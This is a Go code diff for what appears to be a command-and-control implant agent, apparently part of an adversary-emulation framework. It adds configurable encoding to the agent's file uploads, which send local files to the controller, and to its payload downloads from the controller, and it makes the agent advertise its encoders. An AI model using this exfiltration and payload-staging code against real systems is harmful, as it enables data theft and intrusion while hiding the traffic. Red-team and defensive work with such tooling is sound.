@@ -36,7 +36,7 @@ type AgentInterface interface {
 	SetPaw(paw string)
 	Display()
 	DownloadPayloadsForInstruction(instruction map[string]interface{}) ([]string, map[string][]byte)
-	FetchPayloadBytes(payload string) []byte
+	FetchPayloadBytes(payload string, encoding string, encodingOptions map[string]interface{}, link_id string) []byte
 	ActivateLocalP2pReceivers()
 	TerminateLocalP2pReceivers()
 	HandleBeaconFailure() error
@@ -185,6 +185,7 @@ func (a *Agent) GetFullProfile() map[string]interface{} {
 		"available_contacts": contact.GetAvailableCommChannels(),
 		"host_ip_addrs": a.hostIPAddrs,
 		"upstream_dest": a.upstreamDestAddr,
+		"data_encoders": encoders.GetAvailableDataEncoders(),
 	}
 }
 
@@ -300,17 +301,24 @@ func (a *Agent) UploadFiles(instruction map[string]interface{}) {
 			))
 			return
 		}
+		link_id := instruction["id"].(string)
 
+		// Get payload encoding and options
+		encoding, encodingOptions, err := a.getFileEncodingInfo(instruction)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[-] Error unpacking encoding options: %v", err.Error()))
+			return
+		}
 		for _, path := range uploads {
 			filePath := path.(string)
-			if err := a.uploadSingleFile(filePath); err != nil {
+			if err := a.uploadSingleFile(filePath, encoding, encodingOptions, link_id); err != nil {
 				output.VerbosePrint(fmt.Sprintf("[!] Error uploading file %s: %v", filePath, err.Error()))
 			}
 		}
 	}
 }
 
-func (a *Agent) uploadSingleFile(path string) error {
+func (a *Agent) uploadSingleFile(path string, encoding string, encodingOptions map[string]interface{}, link_id string) error {
 	output.VerbosePrint(fmt.Sprintf("Uploading file: %s", path))
 
 	// Get file bytes
@@ -319,7 +327,17 @@ func (a *Agent) uploadSingleFile(path string) error {
 		return err
 	}
 
-	return a.beaconContact.UploadFileBytes(a.GetFullProfile(), filepath.Base(path), fetchedBytes)
+	// Encode file bytes
+	var uploadBytes []byte
+	if len(encoding) > 0 {
+		uploadBytes = a.EncodeUpload(fetchedBytes, encoding, encodingOptions)
+		if uploadBytes == nil {
+			return errors.New("[!] Failed to encode file bytes for upload")
+		}
+	} else {
+		uploadBytes = fetchedBytes
+	}
+	return a.beaconContact.UploadFileBytes(a.GetFullProfile(), filepath.Base(path), uploadBytes, link_id)
 }
 
 func (a *Agent) removePayloadsOnDisk(payloads []string) {
@@ -417,12 +435,18 @@ func (a *Agent) DownloadPayloadsForInstruction(instruction map[string]interface{
 		output.VerbosePrint(fmt.Sprintf("[!] No executor found for executor name %s. Not downloading payloads.", executorName))
 		return nil, nil
 	}
+	link_id := instruction["id"].(string)
+	encoding, encodingOptions, err := a.getFileEncodingInfo(instruction)
+	if err != nil {
+		output.VerbosePrint(fmt.Sprintf("[-] Error unpacking encoding options: %v", err.Error()))
+		return nil, nil
+	}
 	var onDiskPayloadNames []string
 	inMemoryPayloads := make(map[string][]byte)
 	availablePayloads := reflect.ValueOf(payloads)
 	for i := 0; i < availablePayloads.Len(); i++ {
 		payloadName := availablePayloads.Index(i).Elem().String()
-		payloadBytes, filename := a.FetchPayloadBytes(payloadName)
+		payloadBytes, filename := a.FetchPayloadBytes(payloadName, encoding, encodingOptions, link_id)
 		if len(payloadBytes) == 0 || len(filename) == 0 {
 			output.VerbosePrint(fmt.Sprintf("Failed to fetch payload bytes for payload %s", payloadName))
 			continue
@@ -457,9 +481,56 @@ func (a *Agent) WritePayloadToDisk(filename string, payloadBytes []byte) (string
 }
 
 // Will request payload bytes from the C2 for the specified payload and return them.
-func (a *Agent) FetchPayloadBytes(payload string) ([]byte, string) {
+func (a *Agent) FetchPayloadBytes(payload string, encoding string, encodingOptions map[string]interface{}, link_id string) ([]byte, string) {
 	output.VerbosePrint(fmt.Sprintf("[*] Fetching new payload bytes via C2 channel %s: %s", a.GetCurrentContactName(), payload))
-	return a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload)
+	payloadBytes, filename := a.beaconContact.GetPayloadBytes(a.GetTrimmedProfile(), payload, link_id)
+	if len(encoding) > 0 {
+		output.VerbosePrint(fmt.Sprintf("[*] Decoding payload bytes using encoding: %s", encoding))
+		payloadBytes = a.DecodePayload(payloadBytes, encoding, encodingOptions)
+	}
+	return payloadBytes, filename
+}
+
+func (a *Agent) DecodePayload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte {
+	if encoder, ok := encoders.DataEncoders[encoding]; ok {
+		decoded, err := encoder.DecodeData(data, decodingOptions)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error decoding payload: %s", err.Error()))
+			return nil
+		}
+		return decoded
+	} else {
+		output.VerbosePrint(fmt.Sprintf("[!] No encoder found for encoding %s", encoding))
+		return nil
+	}
+}
+func (a *Agent) EncodeUpload(data []byte, encoding string, decodingOptions map[string]interface{}) []byte {
+	output.VerbosePrint(fmt.Sprintf("[*] Encoding upload bytes using encoding: %s", encoding))
+	if encoder, ok := encoders.DataEncoders[encoding]; ok {
+		encoded, err := encoder.EncodeData(data, decodingOptions)
+		if err != nil {
+			output.VerbosePrint(fmt.Sprintf("[!] Error encoding upload: %s", err.Error()))
+			return nil
+		}
+		return encoded
+	} else {
+		output.VerbosePrint(fmt.Sprintf("[!] No encoder found for encoding %s", encoding))
+		return nil
+	}
+}
+
+// Returns tuple of encoding mechanism, encoding options, and error
+func (a *Agent) getFileEncodingInfo(instruction map[string]interface{}) (string, map[string]interface{}, error) {
+	var encodingOptions map[string]interface{}
+	var err error
+	encodingStr := ""
+	if encoding, ok := instruction["file_encoding"]; ok {
+		encodingStr = encoding.(string)
+	}
+	if providedOptions, ok := instruction["encoding_options"]; ok {
+		err = json.Unmarshal([]byte(providedOptions.(string)), &encodingOptions)
+	}
+	return encodingStr, encodingOptions, err
 }
 
 func (a *Agent) Sleep(sleepTime float64) {
